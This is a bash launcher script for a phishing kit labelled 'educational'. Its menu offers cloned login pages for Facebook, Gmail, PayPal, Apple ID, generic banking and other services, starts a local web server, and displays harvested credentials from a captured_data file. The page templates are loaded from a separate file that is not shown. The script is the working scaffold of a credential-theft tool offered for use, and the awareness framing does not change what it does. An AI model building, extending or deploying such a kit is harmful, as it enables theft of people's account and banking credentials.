#!/bin/bash

# Educational Phishing Tool
# Created by: ABID MEHMOOD (The White HAT Hacker)
# Purpose: Educational demonstration of phishing techniques for cybersecurity awareness
# Compatible with: Linux, macOS, Windows (Git Bash/WSL), Termux, Kali Linux

# Detect OS and set appropriate commands
detect_os() {
    if [[ "$OSTYPE" == "linux-android"* ]]; then
        OS="termux"
        PKG_MANAGER="pkg"
        PYTHON_CMD="python"
    elif [[ "$OSTYPE" == "linux-gnu"* ]]; then
        OS="linux"
        PKG_MANAGER="apt-get"
        PYTHON_CMD="python3"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        OS="macos"
        PKG_MANAGER="brew"
        PYTHON_CMD="python3"
    else
        OS="windows"
        PKG_MANAGER="none"
        PYTHON_CMD="python"
    fi
}

# Colors for beautiful output (compatible with all terminals)
if [[ -t 1 ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    PURPLE='\033[0;35m'
    CYAN='\033[0;36m'
    WHITE='\033[1;37m'
    NC='\033[0m' # No Color
else
    RED=''
    GREEN=''
    YELLOW=''
    BLUE=''
    PURPLE=''
    CYAN=''
    WHITE=''
    NC=''
fi

# Banner
show_banner() {
    clear
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════════════════════╗"
    echo "║                                                                              ║"
    echo "║    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗██╗███╗   ██╗ ██████╗                ║"
    echo "║    ██╔══██╗██║  ██║██║██╔════╝██║  ██║██║████╗  ██║██╔════╝                ║"
    echo "║    ██████╔╝███████║██║███████╗███████║██║██╔██╗ ██║██║  ███╗               ║"
    echo "║    ██╔═══╝ ██╔══██║██║╚════██║██╔══██║██║██║╚██╗██║██║   ██║               ║"
    echo "║    ██║     ██║  ██║██║███████║██║  ██║██║██║ ╚████║╚██████╔╝               ║"
    echo "║    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝                ║"
    echo "║                                                                              ║"
    echo "║                    ████████╗ ██████╗  ██████╗ ██╗                          ║"
    echo "║                    ╚══██╔══╝██╔═══██╗██╔═══██╗██║                          ║"
    echo "║                       ██║   ██║   ██║██║   ██║██║                          ║"
    echo "║                       ██║   ██║   ██║██║   ██║██║                          ║"
    echo "║                       ██║   ╚██████╔╝╚██████╔╝███████╗                     ║"
    echo "║                       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝                     ║"
    echo "║                                                                              ║"
    echo "║                     Created by: ABID MEHMOOD                                 ║"
    echo "║                    (The White HAT Hacker)                                   ║"
    echo "║                                                                              ║"
    echo "║                   Educational Cybersecurity Tool                            ║"
    echo "║                  For Learning Phishing Prevention                           ║"
    echo "╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo
}

# Check dependencies
check_dependencies() {
    echo -e "${YELLOW}[*] Checking dependencies for $OS...${NC}"
    
    # Detect OS first
    detect_os
    
    # Check Python
    if ! command -v $PYTHON_CMD &> /dev/null; then
        echo -e "${RED}[!] Python not found. Installing...${NC}"
        install_python
    else
        echo -e "${GREEN}[+] Python found: $(which $PYTHON_CMD)${NC}"
    fi
    
    # Check PHP (optional for advanced features)
    if ! command -v php &> /dev/null; then
        echo -e "${YELLOW}[*] PHP not found. Installing for advanced features...${NC}"
        install_php
    else
        echo -e "${GREEN}[+] PHP found: $(which php)${NC}"
    fi
    
    echo -e "${GREEN}[+] Dependencies checked${NC}"
}

# Install Python based on OS
install_python() {
    case $OS in
        "termux")
            pkg update && pkg install -y python
            ;;
        "linux")
            if command -v apt-get &> /dev/null; then
                sudo apt-get update && sudo apt-get install -y python3 python3-pip
            elif command -v yum &> /dev/null; then
                sudo yum install -y python3 python3-pip
            elif command -v pacman &> /dev/null; then
                sudo pacman -S python python-pip
            fi
            ;;
        "macos")
            if command -v brew &> /dev/null; then
                brew install python3
            else
                echo -e "${RED}[!] Please install Homebrew first${NC}"
            fi
            ;;
        "windows")
            echo -e "${YELLOW}[*] Please install Python from python.org${NC}"
            ;;
    esac
}

# Install PHP based on OS
install_php() {
    case $OS in
        "termux")
            pkg install -y php
            ;;
        "linux")
            if command -v apt-get &> /dev/null; then
                sudo apt-get install -y php
            elif command -v yum &> /dev/null; then
                sudo yum install -y php
            elif command -v pacman &> /dev/null; then
                sudo pacman -S php
            fi
            ;;
        "macos")
            if command -v brew &> /dev/null; then
                brew install php
            fi
            ;;
        "windows")
            echo -e "${YELLOW}[*] PHP installation skipped on Windows${NC}"
            ;;
    esac
}

# Create directory structure
setup_directories() {
    echo -e "${YELLOW}[*] Setting up directory structure...${NC}"
    
    mkdir -p templates
    mkdir -p logs
    mkdir -p captured_data
    mkdir -p assets/css
    mkdir -p assets/js
    mkdir -p assets/images
    
    echo -e "${GREEN}[✓] Directory structure created${NC}"
}

# Main menu
show_menu() {
    echo -e "${WHITE}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${WHITE}║                              MAIN MENU                                      ║${NC}"
    echo -e "${WHITE}╠══════════════════════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${WHITE}║                                                                              ║${NC}"
    echo -e "${CYAN}║  [1]  Facebook Login Page                                                   ║${NC}"
    echo -e "${CYAN}║  [2]  Instagram Login Page                                                  ║${NC}"
    echo -e "${CYAN}║  [3]  Twitter/X Login Page                                                  ║${NC}"
    echo -e "${CYAN}║  [4]  LinkedIn Login Page                                                   ║${NC}"
    echo -e "${CYAN}║  [5]  Gmail Login Page                                                      ║${NC}"
    echo -e "${CYAN}║  [6]  Yahoo Mail Login Page                                                 ║${NC}"
    echo -e "${CYAN}║  [7]  Outlook Login Page                                                    ║${NC}"
    echo -e "${CYAN}║  [8]  PayPal Login Page                                                     ║${NC}"
    echo -e "${CYAN}║  [9]  Amazon Login Page                                                     ║${NC}"
    echo -e "${CYAN}║  [10] eBay Login Page                                                       ║${NC}"
    echo -e "${CYAN}║  [11] Netflix Login Page                                                    ║${NC}"
    echo -e "${CYAN}║  [12] Spotify Login Page                                                    ║${NC}"
    echo -e "${CYAN}║  [13] Apple ID Login Page                                                   ║${NC}"
    echo -e "${CYAN}║  [14] Microsoft Login Page                                                  ║${NC}"
    echo -e "${CYAN}║  [15] GitHub Login Page                                                     ║${NC}"
    echo -e "${CYAN}║  [16] Discord Login Page                                                    ║${NC}"
    echo -e "${CYAN}║  [17] WhatsApp Web Login                                                    ║${NC}"
    echo -e "${CYAN}║  [18] Telegram Web Login                                                    ║${NC}"
    echo -e "${CYAN}║  [19] Steam Login Page                                                      ║${NC}"
    echo -e "${CYAN}║  [20] Dropbox Login Page                                                    ║${NC}"
    echo -e "${CYAN}║  [21] Adobe Login Page                                                      ║${NC}"
    echo -e "${CYAN}║  [22] Banking Login (Generic)                                               ║${NC}"
    echo -e "${CYAN}║  [23] WordPress Login                                                       ║${NC}"
    echo -e "${CYAN}║  [24] Custom Template Creator                                               ║${NC}"
    echo -e "${WHITE}║                                                                              ║${NC}"
    echo -e "${YELLOW}║  [25] View Captured Data                                                    ║${NC}"
    echo -e "${YELLOW}║  [26] Start Web Server                                                      ║${NC}"
    echo -e "${YELLOW}║  [27] Stop Web Server                                                       ║${NC}"
    echo -e "${YELLOW}║  [28] View Server Logs                                                      ║${NC}"
    echo -e "${RED}║  [99] Exit                                                                   ║${NC}"
    echo -e "${WHITE}║                                                                              ║${NC}"
    echo -e "${WHITE}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo -e "${GREEN}Select an option: ${NC}"
}

# Start web server (cross-platform)
start_server() {
    echo -e "${YELLOW}[*] Starting web server...${NC}"
    
    # Kill any existing server
    pkill -f "$PYTHON_CMD -m http.server" 2>/dev/null || true
    pkill -f "python -m http.server" 2>/dev/null || true
    pkill -f "python3 -m http.server" 2>/dev/null || true
    
    # Create templates directory if it doesn't exist
    mkdir -p templates
    
    # Start Python HTTP server
    cd templates
    $PYTHON_CMD -m http.server 8080 > ../logs/server.log 2>&1 &
    SERVER_PID=$!
    echo $SERVER_PID > ../logs/server.pid
    cd ..
    
    sleep 2
    
    if ps -p $SERVER_PID > /dev/null 2>&1; then
        echo -e "${GREEN}[+] Web server started on http://localhost:8080${NC}"
        echo -e "${CYAN}[*] Server PID: $SERVER_PID${NC}"
        echo -e "${CYAN}[*] Access templates at: http://localhost:8080/index.html${NC}"
        
        # Try to open browser (if available)
        if command -v xdg-open &> /dev/null; then
            xdg-open http://localhost:8080 2>/dev/null &
        elif command -v open &> /dev/null; then
            open http://localhost:8080 2>/dev/null &
        elif command -v start &> /dev/null; then
            start http://localhost:8080 2>/dev/null &
        elif command -v termux-open-url &> /dev/null; then
            termux-open-url http://localhost:8080 2>/dev/null &
        fi
    else
        echo -e "${RED}[!] Failed to start web server${NC}"
        echo -e "${YELLOW}[*] Trying alternative method...${NC}"
        
        # Alternative: Use Python directly
        $PYTHON_CMD web_server.py &
        SERVER_PID=$!
        echo $SERVER_PID > logs/server.pid
        echo -e "${GREEN}[+] Alternative server started${NC}"
    fi
}

# Stop web server
stop_server() {
    echo -e "${YELLOW}[*] Stopping web server...${NC}"
    
    if [ -f logs/server.pid ]; then
        SERVER_PID=$(cat logs/server.pid)
        kill $SERVER_PID 2>/dev/null
        rm logs/server.pid
        echo -e "${GREEN}[✓] Web server stopped${NC}"
    else
        pkill -f "python3 -m http.server" 2>/dev/null
        echo -e "${GREEN}[✓] Web server stopped${NC}"
    fi
}

# View captured data
view_captured_data() {
    echo -e "${YELLOW}[*] Captured Data:${NC}"
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════════${NC}"
    
    if [ -f captured_data/credentials.txt ]; then
        cat captured_data/credentials.txt
    else
        echo -e "${RED}[!] No captured data found${NC}"
    fi
    
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}Press Enter to continue...${NC}"
    read
}

# View server logs
view_logs() {
    echo -e "${YELLOW}[*] Server Logs:${NC}"
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════════${NC}"
    
    if [ -f logs/server.log ]; then
        tail -50 logs/server.log
    else
        echo -e "${RED}[!] No server logs found${NC}"
    fi
    
    echo -e "${WHITE}════════════════════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}Press Enter to continue...${NC}"
    read
}

# Main execution
main() {
    # Detect OS first
    detect_os
    
    show_banner
    echo -e "${CYAN}[*] Detected OS: $OS${NC}"
    echo -e "${CYAN}[*] Python command: $PYTHON_CMD${NC}"
    
    check_dependencies
    setup_directories
    
    while true; do
        show_menu
        read -p "" choice
        
        case $choice in
            1) create_facebook_template ;;
            2) create_instagram_template ;;
            3) create_twitter_template ;;
            4) create_linkedin_template ;;
            5) create_gmail_template ;;
            6) create_yahoo_template ;;
            7) create_outlook_template ;;
            8) create_paypal_template ;;
            9) create_amazon_template ;;
            10) create_ebay_template ;;
            11) create_netflix_template ;;
            12) create_spotify_template ;;
            13) create_apple_template ;;
            14) create_microsoft_template ;;
            15) create_github_template ;;
            16) create_discord_template ;;
            17) create_whatsapp_template ;;
            18) create_telegram_template ;;
            19) create_steam_template ;;
            20) create_dropbox_template ;;
            21) create_adobe_template ;;
            22) create_banking_template ;;
            23) create_wordpress_template ;;
            24) create_custom_template ;;
            25) view_captured_data ;;
            26) start_server ;;
            27) stop_server ;;
            28) view_logs ;;
            99) 
                echo -e "${GREEN}[*] Exiting... Stay safe!${NC}"
                stop_server
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Invalid option. Please try again.${NC}"
                sleep 1
                ;;
        esac
    done
}

# Template creation functions will be defined in separate files
source template_creators.sh 2>/dev/null || echo -e "${YELLOW}[*] Template creators will be loaded...${NC}"

# Run main function
main "$@"